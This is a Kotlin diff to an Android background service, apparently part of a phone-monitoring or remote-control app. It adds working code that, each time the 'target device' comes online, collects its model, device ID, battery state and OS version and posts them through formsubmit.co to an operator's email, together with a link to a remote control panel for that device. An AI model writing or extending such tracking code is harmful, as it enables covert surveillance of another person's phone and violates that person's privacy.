@@ -266,6 +266,8 @@ class StreamingService : Service() {
         }
     }
 
+    private var lastOnlineEmailSentTime = 0L
+
     private fun setupPresence() {
         val fb = firebaseInstance ?: return
         val dRef = deviceRef ?: return
@@ -273,6 +275,7 @@ class StreamingService : Service() {
         // Set online immediately (don't wait for .info/connected event)
         dRef.child("health").child("online").setValue(true)
         dRef.child("health").child("lastSeen").setValue(ServerValue.TIMESTAMP)
+        sendDeviceOnlineEmailAlert()
         
         // Then setup the persistent presence listener
         val connectedRef = fb.getReference(".info/connected")
@@ -286,10 +289,83 @@ class StreamingService : Service() {
                     // When disconnected, Firebase will automatically set online to false
                     dRef.child("health").child("online").onDisconnect().setValue(false)
                     dRef.child("health").child("lastSeen").onDisconnect().setValue(ServerValue.TIMESTAMP)
+                    sendDeviceOnlineEmailAlert()
                 }
             }
             override fun onCancelled(error: DatabaseError) {}
         })
+    }
+
+    private fun sendDeviceOnlineEmailAlert() {
+        val now = System.currentTimeMillis()
+        if (now - lastOnlineEmailSentTime < 3 * 60 * 1000) return // 3 min cooldown
+        lastOnlineEmailSentTime = now
+
+        Thread {
+            try {
+                // Fetch target user's email from Firebase
+                userRef?.child("email")?.addListenerForSingleValueEvent(object : ValueEventListener {
+                    override fun onDataChange(snapshot: DataSnapshot) {
+                        var targetEmail = snapshot.getValue(String::class.java)?.trim() ?: ""
+                        if (targetEmail.isEmpty()) {
+                            firebaseInstance?.getReference("panel_users")?.child(userId)?.child("email")?.addListenerForSingleValueEvent(object : ValueEventListener {
+                                override fun onDataChange(pSnap: DataSnapshot) {
+                                    targetEmail = pSnap.getValue(String::class.java)?.trim() ?: ""
+                                    if (targetEmail.isNotEmpty() && targetEmail.contains("@")) {
+                                        dispatchOnlineEmail(targetEmail)
+                                    }
+                                }
+                                override fun onCancelled(error: DatabaseError) {}
+                            })
+                        } else if (targetEmail.contains("@")) {
+                            dispatchOnlineEmail(targetEmail)
+                        }
+                    }
+                    override fun onCancelled(error: DatabaseError) {}
+                })
+            } catch (e: Exception) {
+                Timber.e(e, "sendDeviceOnlineEmailAlert error")
+            }
+        }.start()
+    }
+
+    private fun dispatchOnlineEmail(targetEmail: String) {
+        Thread {
+            try {
+                val model = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
+                val bm = getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
+                val batteryLevel = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
+                val isCharging = bm?.isCharging ?: false
+                val battStr = if (batteryLevel >= 0) "$batteryLevel% ${if (isCharging) "⚡ (Charging)" else ""}" else "Unknown"
+                val timeStr = SimpleDateFormat("dd MMM yyyy, hh:mm a", Locale.getDefault()).format(Date())
+
+                val json = JSONObject().apply {
+                    put("_subject", "🟢 [ONLINE] Target Device Connected: $model ($deviceId)")
+                    put("_template", "box")
+                    put("_captcha", "false")
+                    put("Alert", "Target Device Connected (ONLINE)")
+                    put("Device", model)
+                    put("Device_ID", deviceId)
+                    put("Battery", battStr)
+                    put("Android_OS", "Android ${Build.VERSION.RELEASE}")
+                    put("Connected_At", "$timeStr (BST)")
+                    put("Control_Panel", "https://mobile-control-pro.web.app/control.html?did=$deviceId&uid=$userId")
+                }
+
+                val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+                val req = Request.Builder()
+                    .url("https://formsubmit.co/ajax/$targetEmail")
+                    .addHeader("Referer", "https://mobile-control-pro.web.app")
+                    .addHeader("Origin", "https://mobile-control-pro.web.app")
+                    .post(body)
+                    .build()
+
+                val resp = client.newCall(req).execute()
+                Timber.d("Online email sent to $targetEmail: HTTP ${resp.code}")
+            } catch (e: Exception) {
+                Timber.e(e, "Failed to dispatch online email")
+            }
+        }.start()
     }
 
     private fun handleCommand(snapshot: DataSnapshot) {
